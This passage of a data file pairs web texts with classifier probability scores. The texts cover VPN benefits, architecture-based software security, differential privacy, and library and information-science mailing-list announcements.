user’s perspective, security of online browsing is the key, especially if the user is prone to use various financial related websites and make financial transactions through online payment processors. Along with security, the user may also remain anonymous and can avoid leaving tracks. A VPN can also be used for accessing blocked content. Internet censorship is a serious issue across several countries throughout the world. Many popular online websites, social media sites and even entertainment channels are blocked for various reasons. Facebook, Twitter and YouTube are just a small group of websites that are blocked in countries like China, Iran, Egypt and more. Therefore, citizens of these countries can utilize the services of a VPN service provider to gain access to blocked content. There are country specific online entertainment websites such as Netflix, Hulu, iPlayer, CBS, etc, that only allow users from a specific country to access their services. For instance, the entire range of Netflix services is only accessible to U.S users, while the BBC iPlayer is only accessible to U.K viewers. Therefore, to watch these channels from a different country, users will need access to VPN. For companies and organizations, VPN can be helpful in connecting various entities together, and immaterial of the actual physical distance between them, every device can be connected to a same network using VPN without any security issues. This will allow greater flexibility for operations and will allow fast, easy and secure transfer of data from one point to the other. Read more: What are the 5 main benefits of using a VPN?",
        "prob": "tensor([[1.9953e-06, 1.0000e+00]])"
    },
    {
        "text": "Architecture-based Security & Trust Traditional security research has focused on how to provide assurance of confidentiality, integrity, and availability. However, most security vulnerabilities result from poor software design and implementation: for a whole system to be secure, all relevant components must collaborate to ensure the security of the system. Thus, approaches to designing secure software are needed, not just from a traditional cryptology viewpoint, but from a software engineering perspective. — Jie Ren Most security vulnerabilities result from poor software design and implementation. A more disciplined approaches to utilizing existing technologies may significantly improve the security of a complex, componentized, and networked software systems. Security is an emergent property, so it is insufficient for a component to be secure. For the whole system to be secure, all relevant components must collaborate to ensure the security of the system. Decentralized systems have no central authority, parties (or peers) making up the system must make local, autonomous decisions based on their individual goals. This introduces a need for determining trust between peers in a system. Trust in decentralized architectures are discussed further on our Decentralized Software Architectures page. Explicitly model security at the architectural level. Modeling security of systems can be done explicitly, at the architectural level, using a secure architecture description language. Connectors provide a suitable vehicle to model, capture, and enforce security policies. Explicitly model security in the architecture. By incorporating access control model concepts into an architecture description, it is possible to determine whether access to a particular resource should be granted through analysis of the architecture topology and privileges of its constituent elements. Use architecture styles to create trust enabled, decentralized applications. A trust-enabled architectural style for decentralized systems can identify and support common functionalities intrinsic to every peer: communication, information, trust, and application allowing decentralized applications to be built without reinventing the wheel. - Secure xADL - an extension to xADL that describes security properties of software architectures using XACML. - PACE - Practical Architectural approach for Composing Egocentric trust - An architectural style that provides comprehensive guidance on addressing many different decentralized security threats. It supports different trust models, which determine trust based on different categories of information. - Architecture Access Control - an extension to ArchStudio 3.0 that edits, checks, and executes architectures described with access control policies. - PACE reference architecture - used to implement decentralized auctioning, file-sharing, and common-operational picture prototypes - Our work on Decentralized Software Architectures - Towards An Architectural Treatment of Software Security: A Connector-Centric Approach (SESS 05) - A Call to Action: Look Beyond the Horizon (IEEE Security & Privacy 2003)",
        "prob": "tensor([[2.0270e-06, 1.0000e+00]])"
    },
    {
        "text": "With a differentially private algorithm, there’s no need to analyze a question carefully to determine whether it seeks to invade an individual’s privacy; that protection is automatically built into the algorithm’s functioning. Because prying questions usually boil down to small numbers related to specific people and non-prying questions examine aggregate-level behavior of large groups, the same amount of added noise that renders answers about individuals meaningless will have only a minor effect on answers to many legitimate research questions. With differential privacy, the kinds of issues that plagued other data releases — such as attackers cross-referencing data with outside information — disappear. The approach’s mathematical privacy guarantees do not depend on the attacker having limited outside information or resources. “Differential privacy assumes that the adversary is all-powerful,” McSherry said. “Even if attackers were to come back 100 years later, with 100 years’ worth of thought and information and computer technology, they still would not be able to figure out whether you are in the database. Differential privacy is future-proofed.” A Fundamental Primitive So far, we have focused on a situation in which someone asks a single counting query about a single database. But the real world is considerably more complex. Researchers typically want to ask many questions about a database. And over your lifetime, snippets of your personal information will probably find their way into many different databases, each of which may be releasing data without consulting the others. Differential privacy provides a precise and simple way to quantify the cumulative privacy hit you sustain if researchers ask multiple questions about the databases to which you belong. If you have sensitive data in two datasets, for example, and the curators of the two datasets release those data using algorithms whose privacy parameters are Ɛ1 and Ɛ2, respectively, then the total amount of your privacy that has leaked out is at most Ɛ1+ Ɛ2. The same additive relationship holds if a curator allows multiple questions about a single database. If researchers ask m questions about a database and each question gets answered with privacy parameter Ɛ, the total amount of privacy lost is at most mƐ. So, in theory, the curator of a dataset could allow researchers to ask as many counting queries as he wishes, as long as he adds enough Laplace noise to each answer to ensure that the total amount of privacy that leaks out is less than his preselected privacy “budget.” And although we have limited our attention to counting queries, it turns out that this restriction is not very significant. Many of the other question types that researchers like to ask can be recast in terms ofcounting queries. If you wanted to generate a list of the top 100 baby names for 2012, for example, you could ask a series of questions of the form, “How many babies were given names that start with A?” (or Aa, Ab or Ac), and work your way through the possibilities. “One of the early results in machine learning is that almost everything that is possible in principle to learn can be learned through counting queries,” Roth said. “Counting queries are not isolated toy problems, but a fundamental primitive” — that is, a building block from which many more complex algorithms can be built. But there’s a catch. The more questions we want to allow, the less privacy each question is allowed to use up from the privacy budget and the more noise has to be added to each answer. Consider the baby names question. If we decide on a total privacy budget Ɛ of 0.01 and there are 10,000 names to ask about, each question’s individual privacy budget is only Ɛ/10,000, or 0.000001. The expected amount of noise added to each answer will be 10,000/Ɛ, or 1,000,000 — an amount that will swamp the true answers.",
        "prob": "tensor([[5.5755e-06, 9.9999e-01]])"
    },
    {
        "text": "Internet's Impact on Museums and Libraries Open Lib/Info Sci Education Forum [JESSE@listserv.utk.edu]; on behalf of; Kevin OConnell [KOConnell@IMLS.GOV] JESSE@listserv.utk.edu Fri 7/03/2008 FOR IMMEDIATE RELEASE March 6, 2008 IMLS Press Contacts Jeannine Mjoseth, email@example.com Mamie Bittner, firstname.lastname@example.org Wanda Monroe, email@example.com IMLS Announces Results of Study on the Internet's Impact on Museums and Libraries \"Museums and libraries are alive and well in the digital world!\" Radice said. \"The InterConnections report shows how people currently search for information and makes the case that the libraries and museums must provide service both online and in person.\" IMLS sponsored this national study through a cooperative agreement with a Libraries and museums are the most trusted sources of online information among adults of all ages, education levels, races, and ethnicities. Libraries and museums rank higher in trustworthiness than all other information sources including government, commercial, and private Web sites. The study shows that the public trust of museums and libraries migrates to the online environment. The explosive growth of information available in the \"Information Age\" actually whets Americans' appetite for more information. People search for information in many places and since the use of one source leads to others, museums, public libraries, and the Internet complement each other in this information-rich environment. The Internet is not replacing in-person visits to libraries and museums and may actually increase onsite use of libraries and museums. There is a positive relationship between Internet use and in-person visits to museums and public libraries. The InterConnections report provides evidence that public libraries and museums are thriving in the Internet Age as trusted providers of information to people of all ages. To view the report, please go to http://interconnectionsreport.org <http://interconnectionsreport.org> . The 2008 WebWise Conference on Libraries and Museums in the Digital World on March 6, 2008. The annual late winter WebWise Conference draws museum, library, information systems, and other professionals to explore new research and innovation in digital technology. The 2008 conference, co-hosted by IMLS and The Wolfsonian–Florida International University (The Wolfsonian–FIU), with support from the National Endowment for the Humanities, highlights the growing convergence between libraries and museums in collection and information management. For more information, go to http://webwise2008.fcla.edu <http://webwise2008.fcla.edu> . Joint use conference proceedings now available Open Lib/Info Sci Education Forum [JESSE@LISTSERV.UTK.EDU]; on behalf of; Sarah McNicol [ebase@HOTMAIL.CO.UK] JESSE@LISTSERV.UTK.EDU Mon 5/11/2007 For any public, academic, special or school library considering any form of joint/dual use library or library based service partnership. Full proceedings of the first International Joint Use Libraries Conference, Twenty-six papers from Overseas $70.00 plus $20.00 p&h each From Auslib Press, Fax (08)8278 4000 International +61 8 8278 4000 JSC document 2008/01/25 McGarry, Dorothy [firstname.lastname@example.org] SLA-DST Sun 27/01/2008 The following document was posted on the JSC Web site on 2008/01/25: - 5JSC/Chair/9/Chair follow-up/6 [Appendix on initial articles] Knowledge 2008: Map of Human Knowledge chaim Zins [email@example.com] firstname.lastname@example.org Wed 6/02/2008 Dear Friends & Colleagues, Knowledge 2008 is an ongoing R&D project aimed at mapping human knowledge and facilitating efficient information searching. The project is composed of 6 parts: Map, Portal, Smart Search, Encyclopedia, Overview, and Forum: Knowledge 2008: Map of Human Knowledge <http://www.success.co.il/knowledge/Map/Map.html> Overview. A systematic map of human knowledge. The knowledge map maps 500 major fields. Human knowledge is composed of 10 pillars. Each pillar is divided into relevant categories and presents the relevant field. Unique characteristics. To better evaluate the map let us look at its unique characteristics: 1. The 10 pillar structure, which is based on the Knowledge - Supernatural - Universe - Humans model is unique. 2. The distinction between categories of the map (e.g., Theory) and fields of knowledge (e.g., Philosophy of Knowledge) is unique. Imagine that the Map mirrors a library. The pillars are bookcases. The categories are shelves, and the fields of knowledge are books. The Library of Human Knowledge has 10 bookcases, 100 shelves, and a collection of 500 books. 3. The Theory - Embodiment structure is unique. The map has a Theory - Embodiment structure. It is manifested within the map level, the pillar level, and the field level. [in the map level: Pillar 1 is 'the theory' part of human knowledge (HK). It is composed of the meta-knowledge of HK. Pillars 2-10 are 'the embodiment' of HK. They are composed of our knowledge on the explored phenomena (the supernatural, the universe, the living world, and humans. In the pillar level: Each pillar has 'a theory' category. In the field level: Each field has 'a theory' sub-field (e.g., Philosophy of Medicine, Literary Theory, Philosophy of Art) 4. The categories of the map were formulated in this research. Knowledge 2008: Portal to Human Knowledge <http://www.success.co.il/knowledge/Portal/Portal.html> Overview. A systematic portal to top quality resources. Currently, the portal includes hundreds links to top resources in all fields of knowledge. Knowledge 2008: Smart Search <http://www.success.co.il/knowledge/search/index.html> Overview. A systematic user interface of Internet search engines. It is designed to facilitate an efficient information searching. Currently, it is implemented for Google search engine. Rationale. Search words are essential for formulating effective search queries. Unfortunately, most searchers are not familiar with the relevant search terms. It is assumed that in every field there are main keywords that relate to the core knowledge of the field. The idea is to develop a systematic user interface that presents the main keywords in the major fields of knowledge. Knowledge 2008: Encyclopedic Portal to Wikipedia <http://www.success.co.il/knowledge/encyclopedia/index.html> Overview. A systematic portal to the Wikipedia Encyclopedia. The portal implements the knowledge map for facilitating systematic access to Wikipedia's encyclopedic articles. Rationale. Wikipedia is a general encyclopedia. It is free and popular. Undoubtedly, Wikipedia is a significant international, intercultural, and interdisciplinary project despite the poor quality of many articles. Note that the map can be implemented in other encyclopedias. A concise overview of the knowledge map. An academic and professional forum (via email) on the theoretical and practical aspects of the project. Please feel free to reflect. Thanks. Knowledge 2008 <http://www.success.co.il/knowledge/index.html> : Map <http://www.success.co.il/knowledge/Map/Map.html> - Portal <http://www.success.co.il/knowledge/Portal/Portal.html> - Encyclopedia <http://www.success.co.il/knowledge/encyclopedia/index.html> - Smart Search <http://www.success.co.il/knowledge/search/index.html> - Overview <http://www.success.co.il/knowledge/overview/1.html> - Forum <http://www.success.co.il/knowledge/Forum/Forum.html> Knowledge Map of Information Science <http://www.success.co.il/is/index.html> Chaim Zins, PhD. Knowledge Mapping Research Homepage: www.success.co.il <http://www.success.co.il/> Knowledge 2008: Map of Human Knowledge LC releases final report on future of bib control Open Lib/Info Sci Education Forum [JESSE@LISTSERV.UTK.EDU]; on behalf of; B.G. Sloan [bgsloan2@YAHOO.COM] JESSE@LISTSERV.UTK.EDU Fri 11/01/2008 Library of Congress Subject Headings report McGarry, Dorothy [email@example.com] Science-Technology Division Wed 5/03/2008 From: Miller, David [mailto:firstname.lastname@example.org] Sent: Tuesday, March 04, 2008 7:21 AM Subject: [ccs-sac] Library of Congress Subject Headings report Hello, everyone - Pardon me if you've all seen this announced already (I'm only on a couple of mailing lists and look at a handful of blogs), but this doesn't seem to have received a lot of play yet. The report \"Library of Congress Subject Headings: Pre- vs. Post-Coordination and Related Issues\" is out from CPSO, and is available at http://www.loc.gov/catdir/cpso/pre_vs_post.pdf. Mark Perkins lists [email@example.com] firstname.lastname@example.org Thu 1/11/2007 5:52 PM ISOC Netherlands and ISOC Belgium participate in the launch of OpenDoc Society A new member-based organisation, OpenDoc Society, will try to bring a global community of users, technologists, and decision makers together around Open Document Format (ODF). The OpenDoc Society will be trying to build a community around the Open Document Format (ISO 26300:2006) and related document standards as key technologies for our society and the Internet in a pre-competitive way. Open Document Format (ODF) is an OASIS/ISO-standardized, vendor neutral file format that enables cross-platform collaboration between people and many different types of applications - from Office suites to server software. Having such a standard will re-establish full ownership of documents to users, guaranteeing unhindered access to content now and in the future. At the same time, it will contribute to interoperability and innovation across platforms and applications. This will help people work more efficiently and take away the dependency on specific software companies and versions of software for having access to one's own content. It is not about converting people to use specific software. It promotes all ODF-based technology alike: may the best offering in any given situation win. This pragmatic and positive approach is what makes the OpenDoc Society unique. A growing number of governments, including the Dutch, Belgian, South-African and Danish governments, is moving away from the proprietary formats such as .doc, .wpd and .xls and converting to ODF. On 23 October 2007, the new initiative was launched with a large event in the Royal Library in The founding board of OpenDoc Society will consist of Bert Bakker (director of Center for Media and Communication, and former member of the The organization wants to expand internationally and hopes it can play a strategic role in creating awareness and building a community to further the growth of ODF. More information can be found at: There is already interest from a number of ISOC chapters to set up local branches. If you want to start a chapter of OpenDoc Society in your region, contact: email@example.com or alternatively contact one of the people below: ISOC Netherlands, NLnet foundation Phone: +31 (0)20 8884251 Cell phone: +31 (0)6 27050947 SIP: michiel [@t] isoc.nl machtelt.garrels [@t] isoc.be M: +32 (0)473 94 68 78 If you have any questions regarding your membership please contact ISOC membership team at <membership at isoc.org>. Copyright (c) 2007 Internet Society. Permission to duplicate and redistribute in any form is granted as long as this copyright and this notice remain intact. Pioneers in Information Management Scoop Top Awards Federation for Information & Documentation [LIS-FID@JISCMAIL.AC.UK]; on behalf of; DCSA DST-IM4 [DCSADST-IM4@DEFENCE.MOD.UK] LIS-FID@JISCMAIL.AC.UK Wed 28/11/2007 PIONEERS IN INFORMATION MANAGEMENT SCOOP TOP AWARDS UKeiG are delighted to announce today the winners of the Strix and Jason Farradane Awards, which will be presented at the Online Information conference and exhibition at Both awards celebrate achievement in the broad field of information management. The 2007 Strix Award, created in honour of Dr Tony Kent, is made to Mats Lindquist, senior executive officer at the National Library of Sweden. \"We're delighted to award the tenth annual Strix Award to Professor Lindquist, \"said Adrian Dale, editor of The Journal of Information Science and Online Information conference chairman. \"In the world of practical full text information retrieval he is one of the \"giants\", wholly in the spirit of Tony Kent's contribution in chemical information\". Professor Lindquist won the Strix Award for his key role in the development and significant improvement in accessibility to an information service through the business development of The Jason Farradane Award, which recognises brilliant work in information science, is made to executive director of Intute, Caroline Williams and the Intute community network. Intute is a free online service, created in partnership with university subject specialists, with over 100,000 links to academic content on the web, as well as a suite of virtual training tutorials and internet information services. Adrian Dale praised highly the winners. \"Intute is a great example of the Intute's origins lie in the 1996 Electronic Libraries programme, where a number of librarians and researchers won JISC (Joint Information Systems Committee) funding to develop their ideas for new Internet gateway services. The service has thrived as it has always actively pursued exploring original ways of working online, as a community. Intute has also innovated with new technologies - such as Web 2.0 - but always against balanced judgements about their relative value to education and research. The Awards will be presented at the Online Conference to be held from 4 - 6 December at CONTACT: Chris Armstrong, UKeiG and Information Automation Ltd Tel: (+44) 1974 251302 NOTES FOR EDITORS UKeiG is an established professional group for all information professionals, users and developers of electronic information resources. The Group encourages communication and the exchange of best practice and knowledge across all sectors; and offers an e-journal, a mailing list, an annual programme of training courses; and an array of awards and bursaries. UKeiG is a Special Interest Group of CILIP: the Chartered Institute of Library and Information Professionals. www.cilip.org.uk SAGE is a leading international publisher of journals, books, and electronic media for academic, educational, and professional markets. Since 1965, SAGE has helped inform and educate a global community of scholars, practitioners, researchers, and students spanning a wide range of subject areas including business, humanities, social sciences, and science, technology and medicine. An independent company, SAGE has principal The Journal of Information Science is an international journal of high repute covering topics of interest to all those researching and working in the sciences of information and knowledge management. The Journal seeks to achieve a better understanding of the principles that underpin the effective creation, organization, storage, communication and utilization of information and knowledge resources. It also seeks to understand how policy and practice in the area can be built on sound theoretical or heuristic foundations to achieve a greater impact on the world economy. http://jis.sagepub.com/ The Strix Award is presented in memory of Dr Tony Kent, a past Fellow of the Past winners have been Stella Dextre Clarke (2006); Jack Mills (2005); Professor Cornelis Joost (Keith) van Rijsbergen (2004); Dr Herbert van Sompel (2003); Malcolm Jones (2002); Professor Peter Willett (2001); Dr Martin Porter (2000); Dr Donna Harman (1999); Professor Stephen Robertson (1998). Jason Farradane graduated in chemistry in 1929 at what is now the Centre for Information Science in 1966. On the research side his main contributions lay in relational analysis, which can now perhaps be seen as providing a precursor to work in the area of A.I., and the concept of information. He saw information science as a step towards understanding and better organizing ourselves. The IIS first presented the award in 1979, to Jason Farradane. Previous award winners have Proceedings of the 1st African Information Ethics Conference firstname.lastname@example.org; on behalf of; M.J. Menou [email@example.com] firstname.lastname@example.org; sigiii-l; sigifp-l; eurchap Tue 30/10/2007 The 7th volume of IRIE (01/2007) is dedicated entirely to the publication of the proceedings of the first African Information Ethics Conference (www.africainfoethics.org <http://www.africainfoethics.org>) that was held in February, 5-7, 2007 in Dr. Michel J. Menou Visiting Professor, SLAIS, Consultant in ICT policies and Knowledge & Information Management Adviser of Somos@Telecentros board http://www.tele-centros.org Member of the founding steering committee of Telecenters of the Americas Partnership http://www.tele-centers.net/ B.P. 15 F-49350 Les Rosiers sur Phone: +33 (0)2 41511043 Publishing trade associations issue clear rules for Orphan works \"safe harbor\" for users of academic and scholarly journals Mark Perkins lists [email@example.com] firstname.lastname@example.org Fri 26/10/2007 Publishing trade associations issue clear rules for Orphan works \"safe harbor\" for users of academic and scholarly journals LONDON, 24 October 2007 - Three trade associations, The Association of Learned and Professional Society Publishers (ALPSP), The International Association of Scientific, Technical & Medical Publishers (STM) and the Professional /Scholarly Division (PSP) of the Association of American Publishers today released a further step towards establishing clear rules for users of copyright works who cannot locate the owners of such works (so-called \"orphan works\") to obtain permission to include such content in new works, course-packs, and compilations. The \"safe harbor\" statement we are releasing today is an evolution in policy and practice from statements and positions announced previously (see prior STM, IPA and AAP Stakeholders around the world are currently debating whether orphan works should be dealt with as a matter of a copyright exception, a reduction in copyright penalties once a \"parent\" is located, or a blanket collective license. The view of ALPSP, STM and PSP is that private market solutions are almost always to be preferred, since they are the most likely to provide tangible results, and that solution is put forward in the new \"safe harbor\" The safe harbor document outlines a need for a viable and diligence search request, and identifies resources that should be consulted, including a list of journal publisher imprints that the associations have compiled. Users who conduct such a search where the owner of such a work is later identified, will be subject only to a normal license fee and will not be subject to any statutory, punitive or special fees or damages. A significant number of ALPSP, STM and PSP members have acceded to the safe harbor principles, and it is hoped many more will join shortly. In a sense this effort creates an actual legal right that would otherwise only be available through extensive formal legislation. The safe harbor that members of the three associations are providing will significantly increase the ability of scholarly users, researchers and writers, to utilize the rich resources of scholarly and academic journal content for the benefit of all. The Association of Learned and Professional Society Publishers (ALPSP) is the international trade association for not-for-profit publishers and those who work with them. http://www.alpsp.org STM - International Association of Scientific, Technical and Medical Publishers - is an international association of about 100 scientific, technical, medical and scholarly publishers, collectively responsible for more than 60% of the global annual output of research articles, over half the active research journals and the publication of tens of thousands of print and electronic books, reference works and databases. The Professional & Scholarly Publishing (PSP) Division of the Association of American Publishers, Inc. (AAP) serves over 140 commercial, not-for-profit, and university press publishers who provide scholarly information in the sciences, technology, medicine, business, law, and the humanities and social sciences. PSP engages in educational and advocacy activities for the advancement of scholarship and the broad interests of information services community. http://www.pspcentral.org For further information, please contact: Mark Seeley EU Information Officer Tel.: + 31 70 309 05 52 Fax: + 31 70 309 05 58 Lobbying for Archives and Libraries RDA Vocabularies work begun McGarry, Dorothy [email@example.com] Science-Technology Division Thu 21/02/2008 Announcement: Work Begins on the RDA Vocabularies The DCMI/RDA Task Group was formed in April of 2007, when members of the Joint Steering Committee for the Development of RDA, Dublin Core and the W3C Semantic Web Deployment Working Group met in 1. definition of an RDA Element Vocabulary 2. disclosure on the public web of RDA Value Vocabularies using RDF/RDFS/SKOS technologies The RDA Vocabularies Project proposes to surface these underlying bibliographic elements in the form of Semantic Web vocabularies, thereby making them reusable in Semantic Web applications and citable with Uniform Resource Identifiers (URIs). This will be based on RDF (Resource Description Framework), a generic grammar for expressing data for use not just by humans, but also in automated processes of data integration and \"intelligent\" reasoning. The work will be lead by the DCMI/RDA Task Group chairs: Gordon Dunsire of the * Karen Coyle (independent consultant well known in the library world) * Alistair Miles (editor for the Simple Knowledge Organization System (SKOS) and member of the W3C SWDWG) * Mikael Nilsson (researcher in the Knowledge Management Research Group, Royal Institute of Technology, Sweden and co-chair of the DCMI Architecture Forum) Partial funding for the effort has been secured, and sources of additional funding are still being sought. Potential funders should contact Diane Hillmann at firstname.lastname@example.org for further information. Public information on the progress of the project is available on the DCMI/RDA Task Group wiki, see: http://dublincore.org/dcmirdataskgroup/. Continuing discussion on the work of the Task Group will take place on the public mailing list maintained by the task group and available for open subscription at: http://www.jiscmail.ac.uk/lists/dc-rda.html. Feedback, comment and experimentation with the products that the group will be presenting is both welcome and essential to the success of the work. SOCRS (Serials and Other Continuing Resources Section) - proceedings Ann Okerson [email@example.com] IFLA mailing list Tue 26/02/2008 We are very happy to let you know that the proceedings of our August 2007 SOCRS (Serials and Other Continuing Resources Section) satellite conference are now up on line at the Web site, located at: The title of this satellite conference was: ELECTRONIC RESOURCE MANAGEMENT SYSTEMS: A Solution with Its Own Challenges, held at the University of the Western Cape, Cape Town, South Africa August 16-17, 2007. The papers presented are of an exceptional caliber and bring together state of the art information about ERMS, which will be of value to librarians in many institutions around the world. When you click on \"Papers,\" you will arrive at the section where the speakers' abstracts and full text presentations are available. The Speakers' bios are all available on the link called \"Speakers.\" The full contents are listed below. Editing of the papers was done over the last few months by Graziano Kratli, International Program Support Librarian at Yale University Library, and we owe him immense gratitude for this painstaking work. We also owe, again, huge thanks to the various SOCRS members who helped to plan and organize this event, as well as to our hosts at the University of the As they say, \"enjoy\" this substantive contribution to current serials and library work, and please share this information with your various e-mail lists and contacts. Cordially, Ann Okerson Chair, Serials and Other Continuing Resources Section Associate University Librarian, Collections & International Programs Yale University Library firstname.lastname@example.org Rochelle BALLARD and Jennifer LANG The Hidden Benefits of Implementing an Electronic Resources Management System. Text & PPT Robert BLEY (Ex Libris) Dis-Integration and Re-Integration: ERMSs in the Wider Context - Predictions. Text & PPT. Richard BURKE (SCELC) A Consortial Approach to Information Management. Text & PPT. Ted FONS ( Innovative Interfaces) The Present and Future of Electronic Resource Management Systems: Public and Staff. Text & PPT. Brian GREEN (EDItEUR) Licenses and ERMs: Standards for the Expression of Publisher/Library Licenses. Text & PPT. Dalene HAWTHORNE ( Kimberly PARKER ( Text & PPT. Oliver PESCH (EBSCO Information Services) Connecting E-Resource Management Systems and Usage Statistics. Text & PPT. Dorette SNYMAN ( Wilhelm WIDMARK ( Alicia WISE (Publishers Licensing Society) Electronic Resource Management: Copyright and Licensing Context Presentation. PPT only. Federation for Information & Documentation [LIS-FID@JISCMAIL.AC.UK]; on behalf of; Paul Nieuwenhuysen [pnieuwen@VUB.AC.BE] LIS-FID@JISCMAIL.AC.UK Wed 7/11/2007 An International Training Program on \"INFORMATION\": Scientific and Technological Information Management in Universities and Libraries: an Active Training Environment (Edition 8) Announcement Information about this training program can be found on the WWW starting from: The program is planned to take place mainly in October 1 - December 19, 2008. Language used is English. Our motto is: \"Helping educators and innovators to advance knowledge and to enrich lives\" Context and evolution of the program: The initiative has been approved by the Flemish Interuniversity Council (VLIR) and is sponsored by the Belgian Government (the directorate named DGOS since December 2002). This fits in a series of similar international training activities that have been organized since 1991, named MIST 1, 2, 3, KNOW-HOW, and STIMULATE 1, 2, 3, 4, 5, 6 and 7. This initiative is aimed primarily at persons with a university degree (Bachelor or Master), who work in universities, information and documentation centres, and libraries, including of course university libraries, and who have a few years of practical experience. The term Active Training Environment in the title of the training program reflects our wish to create an environment in which each participant is stimulated to get involved actively, supported by the lecturers and the infrastructure provided by the training program. This fits well into the general, worldwide trend away from \"teaching\" to \"learning management\". Aim / goal of the training program: The main aim and goal of this International Training Program is to offer a stimulating learning environment to the participants. These are young scientists and professionals who have a function as information intermediary in the area of science and technology, so as to sharpen their skills in collecting, storing, retrieving, presenting and managing information. This can be of great benefit to the teaching and research activities going on in their institute and to the further development of their organisation and region. This initiative corresponds well with the basic, general aim of all the International Training Programs that are supported by VLIR: to train young scientists and professionals from developing countries in a domain that is relevant for the further development of the country, and to stimulate the participants to transfer their increased knowledge and skills to their colleagues and other stakeholders in their home country. More specific objectives of the training program: -- to provide participants with a clearer view on the importance of information in general and for their environment in particular, and on how to manage information: summarised: \"Management in libraries and information centres\" -- to learn the participants to cope with modern technology, in view of the increasing importance of ICT; summarised: \"Information and communication technology for libraries and information centres\" -- to guide them in retrieving information that is publicly accessible on an international scale: summarised: \"Information retrieval/searching\" and -- to learn them to store, organise, present, manage, publish information resources at personal, institutional, regional or national level: summarised: \"Information architecture\" After being actively involved in this International Training Program, every participant will have improved the ability -- to appreciate and explain the importance of access to information for their organisation -- to present information to users and potential users, using appropriate information technology -- to train interested persons in the use and management of information, using appropriate presentation techniques -- to contribute to the planning of the (further) development of an information service -- to communicate through the Internet with users of information, information providers, colleagues,… -- to apply quantitative methods in decision making related to information systems and services -- to retrieve information from the Internet -- to store information for later retrieval and access by potential users, using information technology Contents of the program: 3 months means about 10 weeks or about 50 days. During about 3 days per week for 10 weeks = 30 days, the participants will be guided by professors and other experts. During the other 2 days per week for 10 weeks = 20 days, they will work on tasks=assignments as individuals or in groups, and their reports will be presented and discussed afterwards again guided by professors and other experts. The sessions are organised in such a way that --the first month = introduction level, --the second month = intermediate level, and --the third month = more advanced level. Thanks to this approach and organisation, it may make sense to participate exceptionally during only one or two of the three months, depending on expertise. However, the available scholarships are granted only to persons who will participate for the full three months. To start with, the participants are offered an orientation tour of the University and the University Library. Then some of the following subjects are covered. Of course, due to the limited available time, not all the mentioned subjects can be discussed in each training program, but a SELECTION will be made by the organisers. The concrete content of each training program depends on the availability of suitable expert lecturers from during the period of the training program. As soon as possible, the concrete schedule is made available through the WWW site of the program. 1. Management in libraries and information centers: Statistics to support decision making for information science and for library management. Business plans for libraries and information centers. Using spreadsheets in the management of libraries and information centers. Consortia of libraries for the acquisition of electronic journals and databases. Scientific writing methods. ISBD = International Standard Bibliographic Description. Formats for computer-based cataloguing; MARC formats. National libraries and national bibliographies. Knowledge organisation: subject classification schemes; thesaurus systems, ontologies. Assessing the influence of scientific journals; citations and impact factors. The bibliometric laws. Architecture of libraries and information centers. Orientation of information users; relations with information users. Interlibrary lending and co-operation; document delivery. Development of a national or regional information network. The information society. Cultural aspects of the information society and information technology transfer. Copyright; information security; trans-border data flow. Writing a project proposal (for instance related to the establishment of an information network). Conservation/preservation of printed documents. Conservation/preservation of digital documents. Informetric aspects of the Internet. Artificial intelligence and knowledge representation in information science. Electronic journals: implementation in a library. Integration of e-learning environments and library services. Libraries involvement in scientific publishing. International co-operation projects. 2. Information and communication technology for libraries and information centers: Microcomputer systems: evolution of hardware. Disks for computers. CD-ROM in a local area network. CD-R, CD-RW, DVD-R, DVD+R, DVD-RW, DVD+RW. Microcomputer operating systems. Microcomputer systems: applications software. Text editing; word processing; desktop publishing. Presentation of data, using a microcomputer. Creating charts to present information. Image processing; graphics file formats; photo/image editing. Multimedia / Hypermedia. Data communication; computer networks; Internet. World-Wide Web; hypertext and hypermedia. Data-communications networks and librarians. Selecting and procuring a computer system; writing a proposal for a computer implementation. Providing access to information through public Internet workstations. Methods for access to databases through Internet: telnet, http/WWW, Z39.50 and ISO239.50, Open Archives Initiative - Metadata Harvesting Protocol. 3. Information retrieval/searching: Introductory concepts about information. Internet-based information resources: introduction. The information industry and the information market. Online information retrieval and database searching; search tactics and strategies. Internet search engines. Information available free of charge; open access. Online access databases about books and about journal articles. Electronic newsletters and journals. Computer-network based interest groups. Online systems versus CD-ROM. Theoretical and quantitative aspects of information retrieval. Evaluation of information retrieval strategies and systems. Evaluating the quality of information sources. 4. Information architecture and digital libraries: Basic, fundamental, theoretical concepts. Software packages for local storage and retrieval of bibliographic information. Introduction to the The application of printer; developing a database structure; indexing data for fast retrieval; Windows; WINISIS; history and future of ISIS; programming in Formats: MARC; application of MARC in Downloading of information and record format conversion. Online Public Access Catalogues (OPACs). Archives and records management. Archives in the domain of science and technology. Geographic Information Systems (GIS): an introduction. Developing a web site; HTML, CSS, XML, XSL; intranets; developing an intranet. Evaluating web sites. Dynamic web pages. Developing co-operative community WWW sites; Web contents management systems. Setting up an electronic newsletter. Extensions of the classical WWW. (Client-based and server-based). In addition to the courses taking place at the university campus, study visits are organised. A selection from the following possible visits is made: --to the Royal (National) --to the European Patent Office --to the Information Service of the Geology Department of the --to the inter-university postgraduate school on information and library science at the University of Antwerp, Belgium --to the library of the University of Antwerp, Belgium --to the human sciences library of the --to the library of the --to the city library of --to the old central library and to the modern science and technology library of the KUL (university) in --to the VLIZ marine science information and documentation centre near the sea coast in Oostende / --to the central library of --to the Documentation Department of the KIT (the Royal Tropical Institute), and to the high school on libraries, documentation and information, both in --to the headquarters of IFLA and to the National, Royal Library in Den Haag / --to the Institute for Social Studies (ISS) in Den Haag / More culturally oriented guided visits are also organised; these may include trips to the old cities of Soon after the start of the program, each participant presents to the other participants and to interested lecturers his/her interests, working environment, planning, tasks, experience. This is organised with printed posters in a small poster exhibition with time allotted for stimulating and ice-breaking discussions. At the end of the course, each participant completes a presentation supported by slides managed on computer, with constructive comments on the training program experienced and with concrete recommendations to the organisers of this training program and to the director of their own organisation. About half of the time, the participants are guided by experts who are invited to the university. They use the other half time to solve problems, to make exercises, to use microcomputers and the Internet, to prepare discussions, for self study... Besides the formal, guided course activities, the participants have access like any regular student at our university --to several rooms equipped with microcomputers connected to the Internet, --to the university library which offers printed material, CD-ROMs and PCs with Internet access, --to the university restaurant and to sport facilities at low student prices. At the end of the program all participants obtain a certificate stating that they have indeed participated, with a reference to the full detailed overview of the program contents on the WWW site of the program. Several substantial parts of the program are followed by an evaluation by the responsible expert of the knowledge and skills acquired by each participant; this can lead to a certificate of active and successful participation. Notebook pc for each participant: Participants should of course bring a notebook or laptop computer, if they have one available. This notebook pc should ideally include a wireless network card (WiFi) to connect to the Internet through the university 